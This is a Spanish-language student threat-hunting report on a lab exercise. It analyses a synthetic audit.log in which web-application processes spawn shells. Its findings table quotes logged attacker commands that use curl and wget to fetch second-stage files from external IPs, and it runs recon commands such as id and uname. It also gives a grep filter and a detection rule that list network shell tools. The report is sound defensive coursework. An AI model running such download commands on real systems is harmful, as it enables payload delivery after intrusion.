# Detección y caza — Grupo 08

**Integrantes:** Ulises Mateo Bucchino, Jano Stratakis, Valentín Garzaniti, Sofía Belén Raggi · **Fecha:** 29/10/2026

---

## 1. Hipótesis de caza

Si hubo explotación de PHP2Shell o Node2Shell, un proceso de aplicación (`apache2`, `node` o `python`) habrá lanzado como hijo un `sh`, `bash`, `curl` o `wget` en `audit.log`, entre las 09:40Z y las 09:50Z del 27/10/2026, y ese hijo no debería existir en el funcionamiento normal del servicio.

---

## 2. Hallazgos en `audit.log`

Filtro usado (el mismo de `./scripts/detectar.sh`):

```
grep -E 'ppid_comm=(apache2|php-fpm|node|python)' logs/audit.log | grep -E 'comm=(sh|bash|curl|wget|nc)'
```

| Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
|---|---|---|:---:|---|
| L6 · 2026-10-27T09:42:17Z | web01 | `apache2` → `sh -c id` (luego `sh` → `id`, L7) | Sí | Un worker web no lanza shells; `id` es reconocimiento típico tras una RCE. |
| L9 · 2026-10-27T09:43:03Z | api01 | `node` → `sh -c curl http://198.51.100.7/x` (luego `sh` → `curl`, L10) | Sí | Un proceso Node lanza un shell que descarga desde una IP externa: intento de segunda etapa. |
| L14 · 2026-10-27T09:44:22Z | web01 | `apache2` → `wget http://198.51.100.9/a` | Sí | Apache descarga un archivo de una IP externa distinta de la anterior. |
| L16 · 2026-10-27T09:45:10Z | svc01 | `python` → `sh -c uname -a` (luego `sh` → `uname`, L17) | Sí | Reconocimiento del sistema lanzado desde el proceso de la aplicación. |
| L8, L13, L21 · 09:42:40Z, 09:44:10Z, 09:49:00Z | db01 | `sshd` → `bash` (`-bash`) | No (probable) | Sesión SSH interactiva; ver sección 3. |

Evidencia: salida de `./scripts/detectar.sh` en [`capturas/tramo_3_deteccion/detectar-hijos-sospechosos.png`](./capturas/tramo_3_deteccion/detectar-hijos-sospechosos.png) (las 4 líneas L6, L9, L14 y L16).

Las demás líneas (`apache2`→`apache2`, `node`→`node`, `python`→`python`) son procesos del servicio con el mismo nombre que el padre, es decir, funcionamiento normal.

**¿Hay compromiso?** **Sí** en `web01`, `api01` y `svc01`, con evidencia de ejecución de comandos en los tres (L6, L9, L14, L16). **Indeterminado** si las descargas llegaron a completarse: el log solo muestra el lanzamiento del proceso, no su resultado de red. Con la red `labnet` en `internal: true` (`SIN SALIDA` en la verificación de contención), el laboratorio impediría que se completen. El log, en cambio, es sintético y no prueba qué pasó en los contenedores reales.

---

## 3. Falsos positivos

- **`sshd → bash` en `db01` (L8, L13, L21):** coincide con el patrón "shell lanzado por un servicio", pero el padre es `sshd` y es una sesión administrativa. Se distingue porque `sshd` no es un proceso de aplicación expuesto a contenido no confiable y la hora y el usuario coinciden con operación normal. Para confirmarlo harían falta el usuario y la IP de origen, que el log no trae, y contrastar con `last` o `/var/log/auth.log`.
- **`apache2 → apache2` y `node → node`:** el filtro de `detectar.sh` no los marca, pero una regla mal escrita que alerte por "cualquier hijo de apache2" sí los marcaría; son workers normales.
- **Scripts legítimos de la aplicación** que invoquen `sh` (healthchecks, tareas de mantenimiento): se distinguirían por la línea de comandos exacta (`args`) y por un listado de comandos permitidos.

---

## 4. Regla propuesta para Node.js

- **Qué observa:** creación de procesos en `api01` (y en `node-lab`) donde el proceso padre es `node`.
- **Condición que dispara:** `ppid_comm = node` **y** `comm ∈ {sh, bash, curl, wget, nc}` → alerta de severidad alta. Ejemplo sobre el log: L9 (`node → sh`) y L10 (`sh → curl`, encadenado).
- **Pseudo-regla:**

  ```
  host=api01 AND ppid_comm=node AND comm IN (sh, bash, curl, wget, nc)
  ```

- **Falsos negativos posibles:**
  - Binarios no incluidos en la lista (`python`, `perl`, `busybox`, `socat`, etc.).
  - Ejecución dentro del propio proceso `node` (por ejemplo `eval` o módulos cargados en memoria) sin crear un proceso hijo.
  - Que `node` lance primero un proceso con otro nombre (renombrado o `node` lanzando `node`) que luego ejecute el shell: el `ppid_comm` ya no sería `node`.
  - Que el log no capture el evento por pérdida o retención insuficiente.
- **Falsos positivos posibles:** tareas legítimas que usen `child_process` con `sh` (healthchecks, scripts de despliegue); se reducen con una lista blanca de `args`.

---

## 5. Limitaciones del log

- **No registra usuario** que ejecutó el proceso, por lo que no se distingue `www-data` de `root` ni una sesión administrativa de una explotación.
- **No registra IP de origen** de la petición HTTP: no se puede atribuir ni correlacionar con el tráfico entrante. Solo se ven IPs destino en los argumentos (`198.51.100.7`, `198.51.100.9`).
- **No registra el resultado** de los comandos (si `curl`/`wget` descargaron algo, código de salida ni bytes).
- **Retención y alcance:** el log cubre apenas ~10 minutos (09:40Z–09:49Z) de un archivo sintético; no hay evidencia de lo ocurrido antes ni después.
- **Ruido:** las líneas repetitivas de `apache2`/`node`/`python` ocupan la mayor parte del log y dificultan la lectura manual.
- **Sin telemetría de red ni de archivos:** no hay datos de conexiones, DNS ni archivos creados, por lo que no se puede confirmar persistencia ni exfiltración.
- **`detectar.sh` solo muestra el primer nivel de hijos** (filtra por `ppid_comm` de aplicación), por lo que no muestra `id` ni `uname`, que son nietos (hijos de `sh`); hay que leer el log completo para verlos.

---

## 6. Qué no se pudo probar

- Si las descargas hacia `198.51.100.7` y `198.51.100.9` llegaron a completarse: el log no registra el resultado de red.
- Cuál fue la petición de entrada que disparó la ejecución: no hay logs HTTP ni IP de origen.
- Que `audit.log` (sintético, provisto por la cátedra) corresponda a los contenedores reales del laboratorio: `docker top` muestra procesos normales (`apache2`, `node`, `python`) sin shells ni descargas.
- Que la regla de Node.js dispare en un motor de detección real: se razonó sobre el log, no se implementó.
